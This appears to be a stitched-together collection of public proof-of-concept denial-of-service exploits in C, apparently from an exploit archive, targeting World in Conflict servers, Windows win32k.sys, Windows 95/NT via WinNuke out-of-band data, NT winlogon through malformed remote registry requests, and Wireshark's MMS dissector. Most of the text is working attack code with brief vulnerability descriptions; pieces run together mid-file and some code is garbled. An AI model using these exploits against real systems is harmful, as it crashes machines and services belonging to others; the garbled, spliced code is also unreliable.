    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER     "0.1"
#define PORT    48000



int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd;
    u16     port = PORT;
    u8      buff[3];

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "World in Conflict <= 1.008 NULL pointer "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
     < 0) std_err();

    printf("- send malformed packet\n");
    buff[0] = 0;    // 16 bit length
    buff[1] = 0;
    buff[2] = 0;
    send(sd, buff, 3, 0);
    if(!timeout(sd, 2)) recv(sd, buff, sizeof(buff), 0);
    close(sd);

    printf("- wait some seconds\n");
    sleep(ONESEC);

    printf("- check server\n");
    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();

    buff[0] = 1;    // 16 bit length
    buff[1] = 0x80;
    buff[2] = 0x78; // zlib, not implemented here since not needed, this is only a check
    if((connect(sd, (struct sockaddr *)&peer, sizeof(peer)) < 0) || (send(sd, buff, 3, 0) != 3) || (timeout(sd, 2) < 0)) {
        printf("\n  server IS vulnerable!!!\n");
    } else {
        printf("\n  server doesn't seem vulnerable\n");
    }
    close(sd);
    return(0);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*
Windows 2000/XP/2003 win32k.sys SfnINSTRING local kernel Denial of Service Vulnerability 

Effect : Microsoft Windows 2000/XP/2003 full patch 


Author:MJ0011
Published: 2010-04-22


Vulnerability Details: 


Win32k.sys in DispatchMessage when the last call to xxxDefWindowProc, this function in dealing with some 
Message, will call gapfnScSendMessage this function table function to process,
which under the deal 2000/xp/2003 0x4c No. message, there will be SfnINSTRING function called this function when the lParam is not empty, 
direct that the lParam is a memory pointer, and pull data directly from the address
despite the use of the function of the SEH, but as long as the kernel address transmission errors will still cause the system BSOD 
*/

//Exploit code: 

# Include "stdafx.h" 
# Include "windows.h" 
int main (int argc, char * argv []) 
( 
printf("Microsoft Windows Win32k.sys SfnINSTRING Local D.O.S Vuln\nBy MJ0011\nth_decoder$126.com\nPressEnter");

getchar();

HWND hwnd = FindWindow ("DDEMLEvent", NULL); 

if (hwnd == 0) 
( 
printf ("cannot find DDEMLEvent Window! \ n"); 
return 0; 
) 

PostMessage (hwnd, 0x18d, 0x0, 0x80000000); 


return 0; 
) 

/*

Common crash stack: 

kd> kc 

win32k! SfnINSTRING 
win32k! xxxDefWindowProc 
win32k! xxxEventWndProc 
win32k! xxxDispatchMessage 
win32k! NtUserDispatchMessage 
.... 

Windows 7/Vista no such problem 

Thanks: 

Thanks to my colleagues LYL to help me discovered this vulnerability 




th_decoder
2010-04-22
*//*
Windows 2000/XP/2003 win32k.sys SfnLOGONNOTIFY local kernel Denial of Service Vulnerability 

Effect : Microsoft Windows 2000/XP/2003 full patch 


Author:MJ0011
Published: 2010-04-22


Vulnerability Details: 

Win32k.sys in DispatchMessage when the last call to xxxDefWindowProc, this function in dealing with some 
Message, will call gapfnScSendMessage this function table function to process, which under the deal 2000/xp/2003 
0x4c No. message, there will be a function called SfnLOGONNOTIFY, this function again when the wParam == 4/13/12 
When the data directly from the lParam inside out, despite the use of the function of the SEH, but as long as the kernel passes the wrong address, will still lead to 
BSOD 

Pseudo-code: 

if (wParam == 4 | | wParam == 13 | | wParam == 12) 
( 
    v18 = * (_DWORD *) lParam; 
    v19 = * (_DWORD *) (lParam 4); 
    v20 = * (_DWORD *) (lParam 8); 
    v21 = * (_DWORD *) (lParam 12); 
*/

//Exploit code: 

# Include "stdafx.h" 
# Include "windows.h" 
int main (int argc, char * argv []) 
( 
printf("Microsoft Windows Win32k.sys SfnLOGONNOTIFY Local D.O.S Vuln\nBy MJ0011\nth_decoder@126.com\nPressEnter");

getchar();

HWND hwnd = FindWindow ("DDEMLEvent", NULL); 

if (hwnd == 0) 
( 
   printf ("cannot find DDEMLEvent Window! \ n"); 
   return 0; 
) 

PostMessage (hwnd, 0x4c, 0x4, 0x80000000); 


return 0; 
) 

Common crash stack: 

kd> kc 

win32k! SfnLOGONNOTIFY 
win32k! xxxDefWindowProc 
win32k! xxxEventWndProc 
win32k! xxxDispatchMessage 
win32k! NtUserDispatchMessage 
/*
.... 

Windows 7/Vista no such problem 

Thanks: 

Thanks to my colleagues LYL to help me discovered this vulnerability 



th_decoder
2010-04-22
*/source: http://www.securityfocus.com/bid/2010/info

Older versions of Microsoft Windows (95, Windows for Workgroups 3.11, Windows NT up to and including 4.0), as well as SCO Open Server 5.0, have a vulnerability relating to the way they handle TCP/IP "Out of Band" data.

According to Microsoft, "A sender specifies "Out of Band" data by setting the URGENT bit flag in the TCP header. The receiver uses the URGENT POINTER to determine where in the segment the urgent data ends. Windows NT bugchecks when the URGENT POINTER points to the end of the frame and no normal data follows. Windows NT expects normal data to follow. "

As a result of this assumption not being met, Windows gives a "blue screen of death" and stops responding.

Windows port 139 (NetBIOS) is most susceptible to this attack. although other services may suffer as well. Rebooting the affected machine is required to resume normal system functioning. 

/*
        It is possible to remotely cause denial of service to any windows
95/NT user.  It is done by sending OOB [Out Of Band] data to an
established connection you have with a windows user.  NetBIOS [139] seems
to be the most effective since this is a part of windows.  Apparently
windows doesn't know how to handle OOB, so it panics and crazy things
happen.  I have heard reports of everything from windows dropping carrier
to the entire screen turning white.  Windows also sometimes has trouble
handling anything on a network at all after an attack like this.  A
reboot fixes whatever damage this causes.  Code follows.


--- CUT HERE ---
*/
/* winnuke.c - (05/07/97)  By _eci  */
/* Tested on Linux 2.0.30, SunOS 5.5.1, and BSDI 2.1 */


#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>

#define dport 139  /* Attack port: 139 is what we want */

int x, s;
char *str = "Bye";  /* Makes no diff */
struct sockaddr_in addr, spoofedaddr;
struct hostent *host;


int open_sock(int sock, char *server, int port) {
     struct sockaddr_in blah;
     struct hostent *he;
     bzero((char *)&blah,sizeof(blah));
     blah.sin_family=AF_INET;
     blah.sin_addr.s_addr=inet_addr(server);
     blah.sin_port=htons(port);


    if ((he = gethostbyname(server)) != NULL) {
        bcopy(he->h_addr, (char *)&blah.sin_addr, he->h_length);
    }
    else {
         if ((blah.sin_addr.s_addr = inet_addr(server)) < 0) {
           perror("gethostbyname()");
           return(-3);
         }
    }

        if (connect(sock,(struct sockaddr *)&blah,16)==-1) {
             perror("connect()");
             close(sock);
             return(-4);
        }
        printf("Connected to [%s:%d].\n",server,port);
        return;
}


void main(int argc, char *argv[]) {

     if (argc != 2) {
       printf("Usage: %s <target>\n",argv[0]);
       exit(0);
     }

     if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
        perror("socket()");
        exit(-1);
     }

     open_sock(s,argv[1],dport);


     printf("Sending crash... ");
       send(s,str,strlen(str),MSG_OOB);
       usleep(100000);
     printf("Done!\n");
     close(s);
}

/*

source: http://www.securityfocus.com/bid/1331/info

In special circumstances while handling requests to access the Remote Registry Server, Windows NT 4.0 can crash due to winlogon.exe's inability to process specially malformed remote registry requests. Rebooting the machine would be required in order to regain normal functionality.

Only authenticated users on the network would be able to exploit this vulnerability. If Windows NT was configured to deny all remote registry requests, it would not be affected by this vulnerability under any conditions. 

/*
 * crash_winlogon.c
 *
 * by Renaud Deraison - deraison@cvs.nessus.org
 *
 * This code is released under the GNU General Public License.
 * (thanks for respecting this license) 
 *
 * In case you are wondering, here is the motto I applied for this code :
 *
 * 		"Structures are for sissies"
 */
#include <stdio.h>
#include <stdlib.h>
#ifdef WIN32
#include <windows.h>
#define bzero(x,y) memset(x, 0, y)
#else
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <ctype.h>
#define closesocket(x) close(x)
#endif


char * netbios_name(char * orig)
{
 int i, len;
 char * ret = malloc(40);

 bzero(ret, 40);
 len = strlen(orig);
 for(i=0;i<16;i++)
 {
  if(i >= len)
   strcat(ret, "CA");
  else
   {
    int odiv, omod;
    
    odiv = (orig[i] / 16) + 'A';
    omod = (orig[i] % 16) + 'A';
    ret[strlen(ret)]=odiv;
    ret[strlen(ret)]=omod;
   }
 }
 return(ret);
}

char * netbios_redirector()
{
 int i;
 char * ret = malloc(31);
 bzero(ret, 31);
 for(i=0;i<15;i++)strcat(ret, "CA"); 
 strcat(ret, "AA");
 return(ret);
}


char* unicode(char * data)
{
 int len = strlen(data);
 int i;
 char * ret = malloc(110);
 int l = 0;
 
 bzero(ret,110);
 for(i=0;i<len;i++)
 {
  ret[i*2] = data[i];
 }
 
 if(len & 1){
 	ret[len*2+7] = 0x19;
	ret[len*2+9] = 0x02;
	}
 else
   	{
	 ret[len*2+8] = 0x19;
	 ret[len*2+10] = 0x02;
	}	 
		
 return(ret);
}	


char * 
smb_session_request(soc, remote)
 int soc;
 char* remote;
{
 char * nb_remote = netbios_name(remote);
 char * nb_local  = netbios_redirector();
 char * request = malloc(400);
 u_char req_head[] = {0x81, 0x00, 0x00, 0x48, 0x20};
 u_char req_body[] = {0x00, 0x20};
 u_char * answer = malloc(400);
 int n;

 bzero(request, 400);
 memcpy(request, req_head, 5);
 memcpy(request+5, nb_remote, strlen(nb_remote));
 memcpy(request+5+strlen(nb_remote), req_body, 2);
 memcpy(request+5+strlen(nb_remote)+2, nb_local, strlen(nb_local));
 
 send(soc, request, 5+strlen(nb_remote)+strlen(nb_local)+2+1, 0);
 bzero(answer, 400);
 n = recv(soc, answer, 400, 0);
 if(answer[0]==0x82)return(answer);
 else return(NULL);
}

char *
smb_neg_prot(soc)
 int soc;
{
 char * r;
 u_char neg_prot[] = {0x00,0x00,
	 0x00, 0x89, 0xFF, 0x53, 0x4D, 0x42, 0x72, 0x00,
	 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 0x00, 0x00,
	 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	 0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00,
	 0x00, 0x00, 0x00, 0x66, 0x00, 0x02, 0x50, 0x43,
	 0x20, 0x4E, 0x45, 0x54, 0x57, 0x4F, 0x52, 0x4B,
	 0x20, 0x50, 0x52, 0x4F, 0x47, 0x52, 0x41, 0x4D,
	 0x20, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x4D, 0x49,
	 0x43, 0x52, 0x4F, 0x53, 0x4F, 0x46, 0x54, 0x20,
	 0x4E, 0x45, 0x54, 0x57, 0x4F, 0x52, 0x4B, 0x53,
	 0x20, 0x31, 0x2E, 0x30, 0x33, 0x00, 0x02, 0x4D,
	 0x49, 0x43, 0x52, 0x4F, 0x53, 0x4F, 0x46, 0x54,
	 0x20, 0x4E, 0x45, 0x54, 0x57, 0x4F, 0x52, 0x4B,
	 0x53, 0x20, 0x33, 0x2e, 0x30, 0x00, 0x02, 0x4c,
	 0x41, 0x4e, 0x4d, 0x41, 0x4e, 0x31, 0x2e, 0x30,
	 0x00, 0x02, 0x4c, 0x4d, 0x31, 0x2e, 0x32, 0x58,
	 0x30, 0x30, 0x32, 0x00, 0x02, 0x53, 0x61, 0x6d,
	 0x62, 0x61, 0x00
	 };
	 
 send(soc, neg_prot, sizeof(neg_prot), 0);
 r = malloc(4000);
 bzero(r, 4000);
 recv(soc, r, 4000, 0);
 if(!r[9])return(r);
 else return(NULL);
}

char * smb_session_setup(soc, login, password)
 int soc;
 char * login, * password;
{
 int len = strlen(login) + strlen(password) + 57;
 int bcc = 2 + strlen(login) + strlen(password);
 int len_hi = len / 256, len_low = len % 256;
 int bcc_hi = bcc / 256, bcc_lo = bcc % 256;
 int pass_len = strlen(password) + 1;
 int pass_len_hi = pass_len / 256, pass_len_lo = pass_len % 256;
 
 u_char req[] = {0x00,0x00,
    	  len_hi, len_low, 0xFF, 0x53, 0x4D, 0x42, 0x73, 0x00,
	  0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00,
	  0x00, 0x00, 0x0A, 0xFF, 0x00, 0x00, 0x00, 0x04,
	  0x11, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, pass_len_lo,  pass_len_hi, 0x00, 0x00, 0x00, 0x00, bcc_lo,
	  bcc_hi};
	  
  char * r;
  char * s;
  
  s = malloc(5000);
  bzero(s, 5000);
  
  memcpy(s, req, sizeof(req));
  memcpy(s+sizeof(req), password, strlen(password)+1);
  memcpy(s+sizeof(req)+strlen(password)+1, login, strlen(login)+1);
  
 
  send(soc, s, sizeof(req)+strlen(password)+1+strlen(login)+1, 0);
  free(s);
  r = malloc(4000);
  bzero(r, 4000);
  recv(soc, r, 4000, 0);
  if(!r[9])return(r);
  else return(NULL);
}

char * smb_tconx(soc, name, uid)
 int soc;
 char * name;
 int uid;
{
 int high = uid / 256;
 int low = uid % 256;
 int len = 55 + strlen(name) + 1;
 int ulen = 13 + strlen(name);
 u_char req [] = {0x00, 0x00,
 		  0x00, len, 0xFF, 0x53, 0x4D, 0x42, 0x75, 0x00,
		  0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x28, low, high,
		  0x00, 0x00, 0x04, 0xFF, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x01, 0x00, ulen, 0x00, 0x00, 0x5C, 0x5C};
		  
 u_char req2[] = {0x5C, 0x49,
		   0x50, 0x43, 0x24, 0x00, 0x49, 0x50, 0x43, 0x00};


 char * s = malloc(4000);
 
 bzero(s, 4000);
 memcpy(s, req, sizeof(req));
 memcpy(s+sizeof(req), name, strlen(name));
 memcpy(s+sizeof(req)+strlen(name), req2, sizeof(req2));
 send(soc, s, sizeof(req)+sizeof(req2)+strlen(name), 0);
 bzero(s, 4000);
 recv(soc, s, 4000, 0);
 if(!s[9])return(s);
 else return(NULL);
}



char * smbntcreatex(soc, uid, tid)
 int soc, uid, tid;
{
 u_char tid_high = tid / 256, tid_low = tid % 256;
 u_char uid_high = uid / 256, uid_low = uid % 256;
 char* r;
 u_char req[] = {0x00, 0x00,
  		   0x00, 0x5B, 0xFF, 0x53, 0x4D, 0x42, 0xA2, 0x00,
		   0x00, 0x00, 0x00, 0x18, 0x03, 0x00, 0x50, 0x81,
		   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		   0x00, 0x00, tid_low, tid_high, 0x00, 0x28, uid_low, uid_high,
		   0x00, 0x00, 0x18, 0xFF, 0x00, 0x00, 0x00, 0x00,
		   0x07, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00,
		   0x00, 0x00, 0x9F, 0x01, 0x02, 0x00, 0x00, 0x00,
		   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		   0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x01, 0x00,
		   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00,
		   0x00, 0x00, 0x00, 0x08, 0x00, 0x5C, 0x77, 0x69,
		   0x6e, 0x72, 0x65, 0x67, 0x00};
		   
 send(soc, req, sizeof(req), 0);
 r = malloc(4000);
 bzero(r, 4000);
 recv(soc, r, 4000, 0);
 if(!r[9])return(r);
 else return(NULL);
}


char * pipe_accessible_registry(soc, uid, tid, pid)
 int soc, uid, tid, pid;
{
 u_char tid_low = tid % 256, tid_high = tid / 256;
 u_char uid_low = uid % 256, uid_high = uid / 256;
 u_char pipe_low = pid % 256, pipe_high = pid / 256;
 u_char req[] = {
 	0x00, 0x00,
 		  0x00, 0x94, 0xFF, 0x53, 0x4D, 0x42, 0x25, 0x00,
		  0x00, 0x00, 0x00, 0x18, 0x03, 0x00, 0x1B, 0x81,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, tid_low, tid_high, 0x00, 0x28, uid_low, uid_high,
		  0x00, 0x00, 0x10, 0x00, 0x00, 0x48, 0x00, 0x00,
		  0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4C,
		  0x00, 0x48, 0x00, 0x4C, 0x00, 0x02, 0x00, 0x26,
		  0x00, pipe_low, pipe_high, 0x51, 0x00, 0x5C, 0x50, 0x49,
		  0x50, 0x45, 0x5C, 0x00, 0x00, 0x00, 0x05, 0x00,
		  0x0B, 0x00, 0x10, 0x00, 0x00, 0x00, 0x48, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x16,
		  0x30, 0x16, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0xd0,
		  0x8c, 0x33, 0x44, 0x22, 0xF1, 0x31, 0xAA, 0xAA,
		  0x90, 0x00, 0x38, 0x00, 0x10, 0x03, 0x01, 0x00,
		  0x00, 0x00, 0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C,
		  0xc9, 0x11, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10,
		  0x48, 0x60, 0x02, 0x00, 0x00, 0x00};
  u_char * r;
  
  send(soc, req, sizeof(req), 0);
  r = malloc(4000);
  bzero(r, 4000);
  recv(soc, r, 4000, 0);
  if(!r[9])return(r);
  else return(NULL);
}		  

char * registry_access_step1(soc, uid, tid, pid)
 int soc, uid, tid, pid;
{
 u_char tid_low = tid % 256, tid_high = tid / 256;
 u_char uid_low = uid % 256, uid_high = uid / 256;
 u_char pipe_low = pid % 256, pipe_high = pid / 256;
 
 u_char * r;
 u_char req[] = {0x00, 0x00,
 		  0x00, 0x78, 0xFF, 0x53, 0x4D, 0x42, 0x25, 0x00,
		  0x00, 0x00, 0x00, 0x18, 0x03, 0x80, 0x1D, 0x83,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, tid_low, tid_high, 0x00, 0x28, uid_low, uid_high,
		  0x00, 0x00, 0x10, 0x00, 0x00, 0x24, 0x00, 0x00,
		  0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54,
		  0x00, 0x24, 0x00, 0x54, 0x00, 0x02, 0x00, 0x26,
		  0x00, pipe_low, pipe_high, 0x35, 0x00, 0x00, 0x5c, 0x00,
		  0x50, 0x00, 0x49, 0x00, 0x50, 0x00, 0x45, 0x00,
		  0x5C, 0x00, 0x00, 0x00, 0x00, 0x5c, 0x05, 0x00,
		  0x00, 0x03, 0x10, 0x00, 0x00, 0x00, 0x24, 0x00,
		  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0C, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x10, 0xFF,
		  0x12, 0x00, 0x30, 0x39, 0x01, 0x00, 0x00, 0x00,
		  0x00, 0x02};
		  
		  
 send(soc, req, sizeof(req), 0);
 r = malloc(4000);
 bzero(r, 4000);
 recv(soc, r, 4000, 0);
 if(!r[9])return(r);
 else return(NULL);
} 		
		  

void crash_winlogon(soc, uid, tid, pid, key, reply)
 int soc, uid, tid, pid;
 char * key, * reply;
{
 int key_len = strlen(key) + 1;
 int key_len_hi = key_len / 256;
 int key_len_lo = key_len % 256;
 
 int tid_low = tid % 256;
 int tid_high = tid / 256;
 
 int uid_low = uid % 256;
 int uid_high = uid / 256;
 
 int pipe_low = pid % 256;
 int pipe_high = pid / 256;
 
 char * uc = unicode(key);
 int len_uc = 100;
 
 
 int len = 148 + len_uc;
 int len_hi = len / 256;
 int len_lo = len % 256;
 
 int z = 40 +len_uc;
 int z_lo = z % 256;
 int z_hi = z / 256;
 
 int y = 81 + len_uc;
 int y_lo = y % 256;
 int y_hi = y / 256;
 
 int x = 64 + len_uc;
 int x_lo = x % 256;
 int x_hi = x / 256;
 
 int n;
 u_char req[] = {
 		  0x00, 0x00,
 		  len_hi, len_lo, 0xFF, 0x53, 0x4D, 0x42, 0x25, 0x00,
		  0x00, 0x00, 0x00, 0x18, 0x03, 0x80, reply[16], reply[17],
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00,tid_low, tid_high, 0x00, 0x28, uid_low, uid_high,
		  0x00, 0x00, 0x10, 0x00, 0x00, x_lo, x_hi, 0x00,
		  0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54,
		  0x00, x_lo, x_hi, 0x54, 0x00, 0x02, 0x00, 0x26,
		  0x00, pipe_low, pipe_high, y_lo, y_hi, 0x00, 0x5C, 0x00,
		  0x50, 0x00, 0x49, 0x00, 0x50, 0x00, 0x45, 0x00,
		  0x5C, 0x00, 0x00, 0x00, 0x00, 0xb9, 0x05, 0x00,
		  0x00, 0x03, 0x10, 0x00, 0x00, 0x00, x_lo, x_hi,
		  0x00, 0x00, 0x02, 0x00, 0x00, 0x00, z_lo, z_hi,
		  0x00, 0x00, 0x00, 0x00, 0x0F, 0x00};
		  
int x2 = 65535; /* XXXXXX */
int x2_lo = 0xFF, x2_hi = 0xFF;

u_char req2[] = {x2_lo, x2_hi, 0x0A, 0x02, 0x00, 0xEC,
 		0xFD, 0x7F, 0x05, 0x01, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, key_len_lo, key_len_hi, 0x00, 0x00};
			
char * crashme = malloc(4000);
char a[] = {0xFF, 0xFF};
bzero(crashme, 4000);
memcpy(crashme, req, sizeof(req));
memcpy(crashme+sizeof(req), &(reply[84]), 20);
memcpy(crashme+sizeof(req)+20, req2, sizeof(req2));
memcpy(crashme+sizeof(req)+20+sizeof(req2), uc, len_uc);
if((n = send(soc, crashme, len+4, 0))<0)
 {
 perror("send ");
 }
}
		  

int smbntcreatex_extract_pipe(reply)
 char * reply;
{
 return(reply[43]*256+reply[42]);
}	

	   
int tconx_extract_tid(reply)
 char * reply;
{
 return(reply[29]*256+reply[28]);
}

	  
	

int session_extract_uid(reply)
 char * reply;
{
 int low, high;
 
 low = reply[32];
 high = reply[33];
 return((high*256)+low);
}

 
 
#define error() _error(__LINE__)

void _error(int line)
{
 printf("Error at line %d\n", line);
 exit(1);
}

int main(argc, argv)
  int argc;
  char * argv[];
{
 char * r;
 int soc;
 struct sockaddr_in sin;
 int uid, tid, pid;
 char * name; 
 char * ip;
 char * login, * password;
 int i;
#ifdef WIN32
 WSADATA winSockData;
 WSAStartup(0x0101, &winSockData);
#endif


 if(argc < 3)
 {
    printf("Usage : winlogon host_ip netbios_name login [password]\n");
    exit(1);
 }
 
 name = strdup(argv[2]);
 for(i=0;i<strlen(name);i++)name[i] = toupper(name[i]);
 ip = strdup(argv[1]);
 login = strdup(argv[3]);
 if(argv[4])password = strdup(argv[4]);
 else password = "";
 printf("ip : %s\n", ip);
 printf("name : %s\n", name);
 printf("login : %s\n", login);
 printf("password : %s\n", password);
 
 for(i=0;i<200;i++)
 {
 soc = socket(AF_INET, SOCK_STREAM, 0);
 if(soc < 0)error();
 bzero(&sin, sizeof(sin));
 sin.sin_port = htons(139);
 sin.sin_addr.s_addr = inet_addr(ip);
 sin.sin_family = AF_INET;
 connect(soc, (const struct sockaddr*)&sin, sizeof(sin));

 r = smb_session_request(soc, name);
 if(!r)error();free(r);
 
 r = smb_neg_prot(soc);
 if(!r)error();free(r);
 
 
 r = smb_session_setup(soc, login, password);
 if(!r)error();
 uid = session_extract_uid(r);free(r);

 r = smb_tconx(soc, name, uid);
 if(!r)error();
 tid = tconx_extract_tid(r);free(r);
 
 r = smbntcreatex(soc, uid, tid);
 if(!r)error();
 pid = smbntcreatex_extract_pipe(r);free(r);
 
 r = pipe_accessible_registry(soc, uid, tid, pid);
 if(!r)error();free(r);
 
 r =  registry_access_step1(soc, uid, tid, pid);if(!r)error();
 
 crash_winlogon(soc, uid, tid, pid, "x", r);
 shutdown(soc, 2);
 closesocket(soc);
 }
#ifdef WIN32
 WSACleanup();
#endif
 return 0;
}

#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32")

char *http =
       "POST / HTTP/1.0\r\n"
       "Content-Type: application/vnd.wap.mms-message\r\n";

char *hoststr = "Host: %s:%d\r\n";
char *contentlenstr = "Content-Length: %d\r\n\r\n";

unsigned char mms[] =
{
       0x8c,0x80,//X-Mms-Message-Type: m-send-req(0x80)
       0x98,0x7a,0x77,0x65,0x6c,0x6c,0x00,//X-Mms-Transaction-ID: zwell
       0x8d,0x92,//X-Mms-MMS-Version: 1.2
       0x97,0x31,0x33,0x35,0x31,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x00,//To: 13510000000
       0x84,0xa3,//Content-Type: application/vnd.wap.multipart.mixed
       //////////////////////////////////////////////////
       0x01,//multipart,count
       0x0f,//HeadersLen
       0x05,//DataLen
       0x00,//headlen <<<=== If this is 0x00, then wireshark will be crash. The real value is the follow three lines bytes which is 0x0e
       ///
       0x83,0x85,//Utf-8
       0x7a,0x77,0x65,0x6c,0x6c,0x2e,0x74,0x78,0x74,0x00,//Name: zwell.txt
       0x81,0xea,//Charset: utf-8
       ///
       0x7a,0x77,0x65,0x6c,0x6c,//zwell
};

SOCKET connect_to_host(char *h, int p)
{
       SOCKET sock;
       struct hostent *host;
       struct sockaddr_in saddr;

       if((host=gethostbyname(h))==NULL)
       {
               printf("resolv host %s error\n", h);
               exit(-1);
       }

       if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
       {
               printf("create socket error\n");
               exit(-1);
       }
       memset((void *)&saddr, 0, sizeof(struct sockaddr_in));
       saddr.sin_family=AF_INET;
       saddr.sin_addr.s_addr=*((unsigned long *)host->h_addr_list[0]);
       saddr.sin_port=htons(p);
       if(connect(sock, (struct sockaddr *)&saddr, sizeof(saddr))<0)
       {
               printf("connect to host %s on port %d error\n", h, p);
               exit(-1);
       }

       return sock;
}


void socket_init()
{
       WSADATA wsaData;
       WSAStartup(MAKEWORD(2,0), &wsaData);
}


int main(int argc, char **argv)
{
       SOCKET s;
       char sendbuf[1024];
       int len = 0;

       printf("WireShark<0.99.6 MMS protocol DOS PoC\nCoded By ZwelL\nhttp://www.nosec.org\n");
       if(argc != 3)
       {
               printf("usage : %s <host> <port>\n", argv[0]);
               exit(-1);
       }
       socket_init();
       s = connect_to_host(argv[1], atoi(argv[2]));

       strcpy(&sendbuf[len], http);
       len += strlen(http);

       sprintf(&sendbuf[len], hoststr, argv[1], atoi(argv[2]));
       len = strlen(sendbuf);

       sprintf(&sendbuf[len], contentlenstr, sizeof(mms));
       len = strlen(sendbuf);

       memcpy(&sendbuf[len], mms, sizeof(mms));
       len += sizeof(mms);

       send(s, sendbuf, len, 0);

       printf("completed!\n");

       return 0;
}

// milw0rm.com [2007-08-14]
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "gssdkcr.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER         "0.1"
#define BUFFSZ      8192
#define PORT        1485    // info = 1485, data = 1486
#define TIMEOUT     1
#define NICKSIZE    127

#define ADDSHORT(x) *(u_short *)p = x; \
                    p += 2;
#define SEND(x,y)   if(sendto(sd, x, y, 0, (struct sockaddr *)&peer, sizeof(peer)) \
                      < 0) std_err();
#define RECV(x,y)   len = recvfrom(sd, x, y, 0, NULL, NULL); \
                    if(len < 0) std_err();



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz);
